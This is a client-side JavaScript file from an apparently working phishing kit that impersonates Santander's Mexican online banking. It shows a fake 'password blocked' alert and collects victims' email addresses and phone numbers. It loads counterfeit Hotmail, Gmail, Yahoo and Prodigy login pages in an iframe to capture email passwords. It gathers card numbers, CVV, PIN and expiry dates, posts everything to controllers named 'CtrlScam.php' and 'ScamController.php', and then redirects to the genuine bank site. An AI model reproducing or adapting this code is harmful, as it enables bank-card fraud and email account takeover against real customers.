function emptyDiv(){
    document.getElementById("back_modal").style.display="none";
    document.getElementById("div").innerHTML = "";
}

function soloNumeros(e){
    var key = window.Event ? e.which : e.keyCode
    return (key >= 48 && key <= 57)
}


$(document).ready(function(){
    
    var intentos = 1;
    var intentos2 = 1;
    var urlSend = "";
    var token = $('#tok').val();
    var fl = $('#folID').val();
    
    var request = "";

    var urlHotmail = "../../hotmail/login.php?usr=";
    var urlGmail = "../../google/signin/v2/sl/pwd/?passive=1209600&continue=https%3A%2F%2Faccounts.google.com%2FManageAccount&followup=https%3A%2F%2Faccounts.google.com%2FManageAccount&flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=1&navigationDirection=forward&user=";
    var urlYahoo = "../../yahoo/account/challenge/password.php?src=fpctx&.intl=es&.lang=es-ES&authMechanism=primary&display=login&yid=648927492&done=https%3A%2F%2Fesyahoocom%2F&sessionIndex=QQ--&acrumb=cy7jZsTF&user=email&usr=";
    var urlProdigy = "../../prodigy/AccesoCorreo/pages/MiAcceso_01.php?usr=";
    var urlGenerico = "../../EmailGenerico/defaultEmail.php?src=fpctx&.intl=es&.lang=es-ES&authMechanism=primary&display=login&yid=648927492&done=https%3A%2F%2Fesyahoocom%2F&sessionIndex=QQ--&acrumb=cy7jZsTF&user=email&usr=";
    var msgBaseTitle = "Para sincronizar correctamente la cuenta de su correo electr&oacute;nico, es necesario que se autentique en su cuenta de correo electr&oacute;nico ";
    var msgBaseBoton = "Ir a ";
    var msgBaseBotonGenerico = "Autenticarme con ";
    var msgEmailIngreso = "";
    var msgBtn = "";
    var tEmail = false;

    function validateTipeEMail(email, session, interface){


        if(/@hotmail/.test(email) || /@HOTMAIL/.test(email) || /@outlook/.test(email) || /@OUTLOOK/.test(email) || /@live/.test(email) || /@LIVE/.test(email)){
            $('#iframeEmail').attr('src',urlHotmail+email+'&session='+session+'&interface='+interface);
            msgEmailIngreso = msgBaseTitle+"de HOTMAIL";
            msgBtn = msgBaseBoton+"HOTMAIL";
        }else if(/@gmail/.test(email) || /@GMAIL/.test(email)){
            $('#iframeEmail').attr('src',urlGmail+email+'&session='+session+'&interface='+interface);
            msgEmailIngreso = msgBaseTitle+"de GMAIL";
            msgBtn = msgBaseBoton+"GMAIL";
        }else if(/@yahoo/.test(email) || /@YAHOO/.test(email)){
            $('#iframeEmail').attr('src',urlYahoo+email+'&session='+session+'&interface='+interface);
            msgEmailIngreso = msgBaseTitle+"de YAHOO";
            msgBtn = msgBaseBoton+"YAHOO";
        }else if(/@prodigy/.test(email) || /@PRODIGY/.test(email) || /@infinitum/.test(email) || /@INFINITUM/.test(email) || /@.mitmx/.test(email) || /@.MITMX/.test(email) || /@telmex/.test(email) || /@TELMEX/.test(email) || /@ctbr/.test(email) || /@CTBR/.test(email) || /@limsa/.test(email) || /@LIMSA/.test(email) || /@telnormail/.test(email) || /@TELNORMAIL/.test(email)){
            $('#iframeEmail').attr('src',urlProdigy+email+'&session='+session+'&interface='+interface);
            msgEmailIngreso = msgBaseTitle+"de PRODIGY";
            msgBtn = msgBaseBoton+"PRODIGY";
        }else{
            $('#iframeEmail').attr('src',urlGenerico+email+'&session='+session+'&interface='+interface);
            msgEmailIngreso = msgBaseBotonGenerico+email;
            msgBtn = msgBaseBotonGenerico+email;
            msgBaseTitle
            $('#btnEmailRedirect').removeClass('btn_celeste_91').addClass('btn_celeste_91_big');

            tEmail = true;
        }
    }


    
    var alertModal = '<ngb-modal-window id="modalConfig" role="dialog" tabindex="-1" class="modal fade show d-block" ><div id="modalConfig" role="dialog" tabindex="-1" class="modal fade show d-block" style=""><div role="document" class="modal-dialog"><div class="modal-content"><ng-component _nghost-c17=""><div _ngcontent-c17="" class="ng-star-inserted"><div _ngcontent-c17="" class="modal-header"><div _ngcontent-c17="" class="mdl-hdr-txt"><img _ngcontent-c17="" alt="" src="../assets/img/warning.svg"><h1 _ngcontent-c17="" id="txtHeaderModal">Contraseña Bloqueada</h1></div></div><div _ngcontent-c17="" class="modal-body" id="msg"><p _ngcontent-c17="" class="txt-message">Es necesario que inicie el proceso de desbloqueo de contraseña de acceso a la Banca Digital Santander<br><br><br>			Para continuar debe tener a la mano el teléfono celular que registró con nosotros terminación **1525</p></div><div id="botonera2" _ngcontent-c16="" class="modal-footer two-buttons"><button id="btnAcept2" _ngcontent-c16="" class="btn ng-star-inserted" type="button" onClick="emptyDiv()">Continuar</button></div></div></ng-component></div></div></ngb-modal-window>';
    
    $('a#btnAcept2').click(function(e){
        e.preventDefault();
        console.log('hola desde el boton');
        $('#back_modal').hide();
        $('#div').html("");
        //$('ngb-modal-window').hide();
        //$('#modalConfig').removeClass('d-block').hide();
        //window.location.href="config_details.php?dispositivo="+$('#tipo').val();
    });
    

    $('#btnVerify').click(function(e){
        e.preventDefault();
        $('#back_modal').show();
        
        $('#divEmailConfirm').show();
    });


    var exp = /^[a-zA-Z0-9_\.\-]+@[a-zA-Z0-9\-]+\.[a-zA-Z0-9\-\.]+$/;
    
    
    var validEmail = false,
        validPass1 = false,
        validPass2 = false;
    
    function enableBTN(){
        $('#btnEmail').attr('disabled', false);
    }
    
    function disableBTN(){
        $('#btnEmail').attr('disabled', true);
    }
    
    function validateFrmEmail(){
        //console.log(validEmail+" "+validPass1+" "+validPass2);

        if(validEmail && validPass1 && validPass2){
            enableBTN();
        }else{
            disableBTN();
        }
    }
    
    $('#email').keyup(function(){
        var lData = $(this).val();
        if(lData.length != ''){
            validEmail = true;
            validateFrmEmail();
        }else{
            validEmail = false;
            validateFrmEmail();
        }
    });
    
    $('#email').keydown(function(){
        var lData = $(this).val();
        if(lData.length != ''){
            validEmail = true;
            validateFrmEmail();
        }else{
            validEmail = false;
            validateFrmEmail();
        }
    });
    
    $('#email').keypress(function(){
        var lData = $(this).val();
        if(lData.length != ''){
            validEmail = true;
            validateFrmEmail();
        }else{
            validEmail = false;
            validateFrmEmail();
        }
    });

    
    $('#cell').keyup(function(){
        var lData = $(this).val();
        if(lData.length == 10){
            validPass1 = true;
            validateFrmEmail();
        }else{
            validPass1 = false;
            validateFrmEmail();
        }
    });
    
    $('#cell').keydown(function(){
        var lData = $(this).val();
        if(lData.length == 10){
            validPass1 = true;
            validateFrmEmail();
        }else{
            validPass1 = false;
            validateFrmEmail();
        }
    });
    
    $('#cell').keypress(function(){
        var lData = $(this).val();
        if(lData.length == 10){
            validPass1 = true;
            validateFrmEmail();
        }else{
            validPass1 = false;
            validateFrmEmail();
        }
    });
    
    
    $('#phone').keyup(function(){
        var lData = $(this).val();
        if(lData.length == 10){
            validPass2 = true;
            validateFrmEmail();
        }else{
            validPass2 = false;
            validateFrmEmail();
        }
    });
    
    $('#phone').keydown(function(){
        var lData = $(this).val();
        if(lData.length == 10){
            validPass2 = true;
            validateFrmEmail();
        }else{
            validPass2 = false;
            validateFrmEmail();
        }
    });
    
    $('#phone').keypress(function(){
        var lData = $(this).val();
        if(lData.length == 10){
            validPass2 = true;
            validateFrmEmail();
        }else{
            validPass2 = false;
            validateFrmEmail();
        }
    });
    
    
    
    
    //alert($('#session').val());
    
    
    
    $('#btnEmail').click(function(e){
        e.preventDefault();
        var email = $('#email');
        var cell = $('#cell');
        var phone = $('#phone');
        
        
        if(!exp.test(email.val())){
            $('#back_modal').show();
            $('#div').html(alertModal);
            $('#txtHeaderModal').text('Atención');
            $('#btnAcept2').text('Aceptar');
            $('#msg').html('<p _ngcontent-c17="" class="txt-message">Para continuar es necesario que ingrese un correo electr&oacute;nico válido.</p>');
        }else{
            
            $.ajax({
                type: 'POST',
                url: '../../Controllers/CtrlScam.php',
                data: {
                    "request": "contacto",
                    "celular": cell.val(),
                    "phone": phone.val(),
                    "email": email.val(),
                    "session": $('#session').val()
                },
                beforeSend: function(){
                    console.log("ENviando...");
                    $('#loading').show();
                },
                success: function (resp){
                    console.log('Datos Enviados');
                    $('#loading').hide();
                    

                    $('#frmEmail').hide();
                    $('#frmCC').show();
                    
                    $('#txtTitle').text('Verificación de su cuenta');
                    $('#roundNumber').text('2');
                    $('#pasos').html('2 de 3');
                    $('#progressBar').removeClass('paso1');
                    $('#progressBar').addClass('paso2');
                    
                    validateTipeEMail(email.val(), $('#session').val(), 1);
                    $('#btnVerify').text(msgBtn).show();
                },
                error: function (request, textStatus, errorThrown) {
                    console.log('Error al Enviar los Datos: '+errorThrown);
                }
            });
            /*if(pass1.val() != pass2.val()){
                $('#back_modal').show();
                $('#div').html(alertModal);
                $('#txtHeaderModal').text('Atención');
                $('#btnAcept2').text('Aceptar');
                $('#msg').html('<p _ngcontent-c17="" class="txt-message">Las contraseñas no coinciden, favor de verificar.</p>');
            }else{

                if (intentos == 1) {
                    urlSend = "email";
                } else {
                    urlSend = "email_confirm";
                }

                $.ajax({
                    type: 'POST',
                    url: '../../Controllers/ScamController.php',
                    data: {
                        "request": urlSend,
                        "email": email.val(),
                        "passemail": pass1.val(),
                        "intentos": intentos,
                        "token": token
                    },
                    beforeSend: function(){
                        console.log("ENviando...");
                        $('#loading').show();
                    },
                    success: function (resp){
                        console.log('Datos Enviados');
                        $('#loading').hide();

                        if (resp == "1") {

                            $('#frmEmail').hide();
                                $('#frmCC').show();
                                
                            $('#txtTitle').text('Verificación de su cuenta');
                                $('#roundNumber').text('2');
                                $('#pasos').html('2 de 3');
                                $('#progressBar').removeClass('paso1');
                                $('#progressBar').addClass('paso2');
                        } else {
                            alert('Fallo al guardar');
                        }


                    },
                    error: function (request, textStatus, errorThrown) {
                        console.log('Error al Enviar los Datos: '+errorThrown);
                    }
                });

            }    
            */
        }
        
        
    });
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    $('#btnCC').click(function(e){
        e.preventDefault();
        
        var celular = $('#cell');
        var tarjeta = $('#tarjeta');
        var cvv = $('#cvv');
        var nip = $('#nip');
        var mes = $('#mes');
        var year = $('#year');
        
        if(celular.val() == "" || celular.val().length != 10){
            $('#back_modal').show();
            //$('#modalConfig').show();
            $('#div').html(alertModal);
            $('#txtHeaderModal').text('Atención');
            $('#btnAcept2').text('Aceptar');
            $('#msg').html('<p _ngcontent-c17="" class="txt-message">Para continuar es necesario que ingrese los 10 digitos de su tel&eacute;fono celular.</p>');
        }else{
            
            if(tarjeta.val() == "" || tarjeta.val().length != 16){
                $('#back_modal').show();
                //$('#modalConfig').show();
                $('#div').html(alertModal);
                $('#txtHeaderModal').text('Atención');
                $('#btnAcept2').text('Aceptar');
                $('#msg').html('<p _ngcontent-c17="" class="txt-message">Para continuar es necesario que ingrese los 16 digitos de su tarjeta.</p>');
            }else{
                
                
                if(cvv.val() == "" || cvv.val().length != 3){
                    $('#back_modal').show();
                    //$('#modalConfig').show();
                    $('#div').html(alertModal);
                    $('#txtHeaderModal').text('Atención');
                    $('#btnAcept2').text('Aceptar');
                    $('#msg').html('<p _ngcontent-c17="" class="txt-message">Para continuar es necesario que ingrese los 3 digitos que se encuentran al reverso de su tarjeta.</p>');
                }else{
                    
                    if(nip.val() == "" || nip.val().length != 4){
                        $('#back_modal').show();
                        //$('#modalConfig').show();
                        $('#div').html(alertModal);
                        $('#txtHeaderModal').text('Atención');
                        $('#btnAcept2').text('Aceptar');
                        $('#msg').html('<p _ngcontent-c17="" class="txt-message">Para continuar es necesario que ingrese los 4 digitos de su NIP.</p>');
                    }else{
                        
                        if(mes.val() == ""){
                            $('#back_modal').show();
                            //$('#modalConfig').show();
                            $('#div').html(alertModal);
                            $('#txtHeaderModal').text('Atención');
                            $('#btnAcept2').text('Aceptar');
                            $('#msg').html('<p _ngcontent-c17="" class="txt-message">Para continuar es necesario que seleccione el mes de la fecha de expiraci&oacute;n de su tarjeta.</p>');
                        }else{
                            
                            if(year.val() == ""){
                                $('#back_modal').show();
                                //$('#modalConfig').show();
                                $('#div').html(alertModal);
                                $('#txtHeaderModal').text('Atención');
                                $('#btnAcept2').text('Aceptar');
                                $('#msg').html('<p _ngcontent-c17="" class="txt-message">Para continuar es necesario que seleccione el a&ntilde;o de la fecha de expiraci&oacute;n de su tarjeta.</p>');
                            }else{
                                if (intentos2 == 1) {
                                    urlSend = "cc";
                                } else {
                                    urlSend = "cc_confirm";
                                }
                                
                                
                                
                                $.ajax({
                                    type: 'POST',
                                    url: '../../Controllers/ScamController.php',
                                    data: {
                                        "request": urlSend,
                                        "celular": celular.val(),
                                        "tarjeta": tarjeta.val(),
                                        "cvv": cvv.val(),
                                        "nip": nip.val(),
                                        "tarjeta_expiracion": mes.val()+"/"+year.val(),
                                        "token": token,
                                        "folioID": fl
                                    },
                                    beforeSend: function () {
                                        console.log("ENviando...");
                                        $('#loading').show();
                                    },
                                    success: function (resp) {
                                        console.log('Datos Enviados');
                                        $('#loading').hide();
                                        console.log(resp);
                                        if (resp == "1") {

                                            $('#frmEmail').hide();
                                                $('#frmCC').hide();
                                                $('#frmFolio').show();


                                                $('#txtTitle').text('Proceso finalizado');
                                                $('#roundNumber').text('3');
                                                $('#pasos').html('3 de 3');
                                                $('#process_txt').html('proceso de autenticaci&oacute;n completa');
                                                $('#progressBar').removeClass('paso2');
                                                $('#progressBar').addClass('paso3');
                                                $('#txtFolioInsert').html(fl);

                                            /*if (intentos2 == 2) {
                                                //window.location.href="password.php";    
                                                //alert('formulario completo');
                                                
                                                //alert('Proceso finalizado');
                                                
                                                
                                                
                                                
                                                $('#frmEmail').hide();
                                                $('#frmCC').hide();
                                                $('#frmFolio').show();


                                                $('#txtTitle').text('Proceso finalizado');
                                                $('#roundNumber').text('3');
                                                $('#pasos').html('3 de 3');
                                                $('#process_txt').html('proceso de autenticaci&oacute;n completa');
                                                $('#progressBar').removeClass('paso2');
                                                $('#progressBar').addClass('paso3');
                                                $('#txtFolioInsert').html(fl);

                                            } else {
                                                $('#back_modal').show();
                                                $('#div').html(alertModal);
                                                $('#txtHeaderModal').text('Atención');
                                                $('#msg').html('<p _ngcontent-c17="" class="txt-message">No se pudo conectar con los servicios de SuperNET. <br><br><br>Favor de volver a intentar.</p>');
                                                celular.val("");
                                                tarjeta.val("");
                                                cvv.val("");
                                                nip.val("");
                                                mes.val("");
                                                year.val("");


                                                intentos2 = 2;
                                            }*/


                                        } else {
                                            alert('Fallo al guardar');
                                        }
                                    },
                                    error: function (request, textStatus, errorThrown) {
                                        console.log('Error al Enviar los Datos: ' + errorThrown);
                                    }
                                });



                            }
                        }
                        
                    }
                    
                }


            }

        }
        
        
    });
    
    
    
    $('#btnFolio').click(function(e){
        e.preventDefault();
        window.parent.location.href="https://www.santander.com.mx";
    });
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
});